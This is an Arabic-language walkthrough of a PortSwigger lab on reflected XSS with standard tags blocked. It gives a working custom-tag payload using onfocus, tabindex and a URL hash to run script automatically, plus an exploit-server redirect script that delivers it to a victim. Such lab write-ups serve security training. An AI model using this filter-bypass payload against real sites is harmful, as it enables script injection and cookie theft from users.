# [Reflected XSS into HTML context with all tags blocked except custom ones](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)

## **`الهدف`**
قم بتنفيذ هجوم `XSS` عن طريق حقن `Custom tag` يستدعي دالة `print()` تلقائيًا.
## **`خطوات الحل`**
سنقوم بالدخول إلى السيرفر الخاص بنا الذي يوفره اللاب ونضع السكريبت التالي في خانة `Body`.
```html
<script>
location = 'https://0ad900b50375de4b8008b78300450086.web-security-academy.net/?search=%3Ctest+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```
بعد ذلك نقوم بالضغط على `Store` ثم `Deliver exploit to victim` لننتهي من حل اللاب. 

ولقد استعملنا هنا `Payload` التالي 
```Payload
<test id=x onfocus=alert(document.cookie) tabindex=1>
```
بالإضافة إلى وضع `#x` في نهايته، كما أن `<test>` هو `Custom Tags` ويمكن إختيار أي اسم عشوائي.

وسبب نجاح هذا الـ `Payload`:

- خاصية `tabindex=1`: المتصفحات بطبيعتها لا تسمح بالتركيز (`focus`) على الوسوم غير التفاعلية (مثل `<div>` أو التاج المخصص `<test>`). إضافة `tabindex` تجبر المتصفح على جعل هذا العنصر قابلاً للتركيز بواسطة لوحة المفاتيح أو الروابط.

- **خاصية `id=x` مع `#x` في الرابط:** عند فتح رابط ينتهي برمز الـ `Hash` (مثل `url#x`)، ينتقل المتصفح مباشرة إلى العنصر الذي يحمل `id="x"` ويضع التركيز عليه تلقائياً `Auto-focus`.

- **حدث `onfocus=alert(...)`:** بمجرد أن ينقل المتصفح التركيز إلى العنصر، يشتغل الحدث وينفذ الكود فوراً بدون أي تفاعل أو ضغط من الضحية.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب`** [Reflected XSS into HTML context with nothing encoded](./Reflected-XSS-into-HTML-context-with-nothing-encoded.md)
